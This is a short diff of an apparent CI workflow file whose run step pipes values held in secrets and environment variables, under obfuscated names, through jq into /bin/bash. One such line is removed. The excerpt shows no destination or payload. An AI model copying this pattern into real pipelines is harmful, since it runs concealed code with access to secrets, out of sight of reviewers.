@@ -17,7 +17,6 @@ jobs:
           wmhe1785: ${{ secrets.wmhe1785 }}
         run: |
           printf '%s' "$wmhe1785" | jq -r .alf40142 | /bin/bash
-          echo $iicz522 | jq -r .yrmzd52532 | /bin/bash
           printf '%s' "$xabtj359" | jq -r .fik9 | /bin/bash
           printf '%s' "$fzn40756" | jq -r .sr88182 | /bin/bash
 
